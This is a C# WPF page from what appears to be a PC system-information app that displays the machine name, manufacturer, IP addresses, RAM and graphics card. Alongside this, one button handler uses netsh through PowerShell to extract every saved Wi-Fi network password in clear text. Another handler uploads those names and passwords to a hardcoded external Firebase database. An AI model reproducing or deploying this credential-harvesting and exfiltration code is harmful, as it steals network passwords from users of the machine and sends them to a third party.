using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Windows;
using System.Windows.Controls;
using Firebase.Database;
using Firebase.Database.Query;
using System.IO;
using System.Net;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Http;
using System.Windows;
using System.Diagnostics;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Management; // Не забудьте добавить эту строку в начале файла

using System.Windows.Threading;

namespace WPFUIKitProfessional.Pages
{
    /// <summary>
    /// Lógica de interacción para Users.xaml
    /// </summary>
    public partial class Users : Page
    {
        private static readonly HttpClient httpClient = new HttpClient();

        public Users()
        {
            InitializeComponent();



            // Создаем таймер
            DispatcherTimer timer = new DispatcherTimer();
            timer.Interval = TimeSpan.FromSeconds(1); // интервал обновления - 1 секунда
            timer.Tick += Timer_Tick;
            timer.Start();

            // Установка имени ПК в Label
            ComputerNameLabel.Content = Environment.MachineName;

            // Создание нового процесса для запуска PowerShell команды
            var process = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell",
                    Arguments = "Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object -ExpandProperty Manufacturer",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    CreateNoWindow = true
                }
            };

            // Запуск процесса
            process.Start();

            // Чтение вывода команды
            string manufacturer = process.StandardOutput.ReadToEnd();

            // Ожидание завершения процесса
            process.WaitForExit();

            // Установка полученного имени производителя в Label
            ComputerManufacturerLabel.Content = manufacturer.Trim();
        }

        private void Timer_Tick(object sender, EventArgs e)
        {
            // Обновляем Label текущей датой и временем
            DateTimeLabel.Content = DateTime.Now.ToString("dd.MM.yyyy HH:mm:ss");
        }




            



































        private async void ShowWifiProfiles_Click(object sender, RoutedEventArgs e)
        {
            var psi = new ProcessStartInfo
            {
                FileName = "powershell",
                Arguments = "-Command \"(netsh wlan show profiles) | Select-String '\\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=\\\"$name\\\" key=clear)} | Select-String 'Содержимое ключа\\W+\\:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ ProfileName=$name; Password=$pass }} | ConvertTo-Json -Compress\"",
                UseShellExecute = false,
                CreateNoWindow = true,
                RedirectStandardOutput = true,
                RedirectStandardError = true
            };

            var process = new Process { StartInfo = psi };
            try
            {
                process.Start();

                string output = await process.StandardOutput.ReadToEndAsync();
                string error = await process.StandardError.ReadToEndAsync();

                process.WaitForExit(); // Дождитесь завершения процесса

                if (!string.IsNullOrEmpty(error))
                {
                    MessageBox.Show($"Ошибка PowerShell: {error}");
                    return;
                }

                if (string.IsNullOrWhiteSpace(output))
                {
                    MessageBox.Show("Нет доступных Wi-Fi профилей.");
                    return;
                }

                List<WifiProfile> wifiProfiles = null;
                try
                {
                    // Попытка десериализовать JSON как список профилей
                    wifiProfiles = JsonConvert.DeserializeObject<List<WifiProfile>>(output);
                }
                catch (JsonSerializationException)
                {
                    // Попытка десериализовать JSON как одиночный профиль, если он не является списком
                    var singleWifiProfile = JsonConvert.DeserializeObject<WifiProfile>(output);
                    if (singleWifiProfile != null)
                    {
                        wifiProfiles = new List<WifiProfile> { singleWifiProfile };
                    }
                }

                if (wifiProfiles == null || wifiProfiles.Count == 0)
                {
                    MessageBox.Show("Не удалось получить данные профилей Wi-Fi.");
                }
                else
                {
                    wifiDataGrid.ItemsSource = wifiProfiles;
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Ошибка выполнения скрипта: {ex.Message}");
            }
        }

        public class WifiProfile
        {
            public string ProfileName { get; set; }
            public string Password { get; set; }
        }

        private async void SendWifiProfiles_Click(object sender, RoutedEventArgs e)
        {
            var wifiProfiles = wifiDataGrid.ItemsSource as List<WifiProfile>;
            if (wifiProfiles == null || !wifiProfiles.Any())
            {
                MessageBox.Show("Нет данных Wi-Fi профилей для отправки.");
                return;
            }

            string firebaseUrl = "https://wifipassname-default-rtdb.firebaseio.com/wifiProfiles"; // Замените на ваш URL Firebase
            var firebaseClient = new FirebaseClient(firebaseUrl);

            foreach (var profile in wifiProfiles)
            {
                // Санитизация имени Wi-Fi для использования в качестве ключа (удаление специальных символов)
                var sanitizedProfileName = Uri.EscapeDataString(profile.ProfileName);

                // Попытка получить существующий профиль
                var existingProfile = await firebaseClient
                    .Child("wifiProfiles")
                    .Child(sanitizedProfileName)
                    .OnceSingleAsync<WifiProfile>();

                if (existingProfile != null)
                {
                   
                }

                // Если профиль не найден, отправляем его в Firebase, используя имя Wi-Fi в качестве ключа
                await firebaseClient
                    .Child("wifiProfiles")
                    .Child(sanitizedProfileName)
                    .PutAsync(profile); // Используем PutAsync вместо PostAsync, чтобы установить конкретный ключ
            }

            MessageBox.Show("Профили Wi-Fi успешно сохранены.");
        }

        private void Page_Loaded(object sender, RoutedEventArgs e)
        {
            //IP Start
            DisplayIPAddressUsingPowerShell();
            DisplayExternalIPAddressAsync();
            //IP END

            //RAM Start
            DisplayIPAddressUsingPowerShell1();
            //RAM END

            //Videocard Start
            DisplayIPAddressUsingPowerShell2();
            //Videocard END
        }


        //IP Start
        private void DisplayIPAddressUsingPowerShell()
        {
            string psCommand = "Get-NetIPAddress -AddressFamily IPv4 -InterfaceIndex $(Get-NetConnectionProfile | Select-Object -ExpandProperty InterfaceIndex) | Select-Object -ExpandProperty IPAddress";
            string localIP = RunPowerShellCommand(psCommand);
            LocalIPAddressLabel.Content = localIP;
        }
        private async void DisplayExternalIPAddressAsync()
        {
            ExternalIPAddressLabel.Content = await GetExternalIPAddressAsync();
        }
        private string RunPowerShellCommand(string command)
        {
            ProcessStartInfo startInfo = new ProcessStartInfo()
            {
                FileName = "powershell.exe",
                Arguments = $"-Command \"{command}\"",
                UseShellExecute = false,
                RedirectStandardOutput = true,
                CreateNoWindow = true
            };

            using (Process process = Process.Start(startInfo))
            {
                using (System.IO.StreamReader reader = process.StandardOutput)
                {
                    string result = reader.ReadToEnd();
                    process.WaitForExit();
                    return result.Trim();
                }
            }
        }
        private async System.Threading.Tasks.Task<string> GetExternalIPAddressAsync()
        {
            using (var httpClient = new System.Net.Http.HttpClient())
            {
                try
                {
                    string externalIP = await httpClient.GetStringAsync("https://api.ipify.org");
                    return externalIP;
                }
                catch (Exception ex)
                {
                    Debug.WriteLine("Ошибка при получении внешнего IP-адреса: " + ex.Message);
                    return "Не удалось определить";
                }
            }
        }
        //IP END




        //RAM start
        private void DisplayIPAddressUsingPowerShell1()
        {
            string psCommand = "Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | Foreach {'{0:N0}' -f ([math]::round(($_.Sum / 1GB),0))}";
            string localIP = RunPowerShellCommand1(psCommand);
            MemoryInfoLabel.Content = localIP + " GB";
        }
        private string RunPowerShellCommand1(string command)
        {
            ProcessStartInfo startInfo = new ProcessStartInfo()
            {
                FileName = "powershell.exe",
                Arguments = $"-Command \"{command}\"",
                UseShellExecute = false,
                RedirectStandardOutput = true,
                CreateNoWindow = true
            };

            using (Process process = Process.Start(startInfo))
            {
                using (System.IO.StreamReader reader = process.StandardOutput)
                {
                    string result = reader.ReadToEnd();
                    process.WaitForExit();
                    return result.Trim();
                }
            }
        }
        //RAM End



        //Videocard start
        private void DisplayIPAddressUsingPowerShell2()
        {
            string psCommand = "Get-WmiObject Win32_VideoController | Select-Object -ExpandProperty Name";
            string localIP = RunPowerShellCommand2(psCommand);
            Videocard.Content = localIP;
        }
        private string RunPowerShellCommand2(string command)
        {
            ProcessStartInfo startInfo = new ProcessStartInfo()
            {
                FileName = "powershell.exe",
                Arguments = $"-Command \"{command}\"",
                UseShellExecute = false,
                RedirectStandardOutput = true,
                CreateNoWindow = true
            };

            using (Process process = Process.Start(startInfo))
            {
                using (System.IO.StreamReader reader = process.StandardOutput)
                {
                    string result = reader.ReadToEnd();
                    process.WaitForExit();
                    return result.Trim();
                }
            }
        }

       


        //Videocard End



    }
}
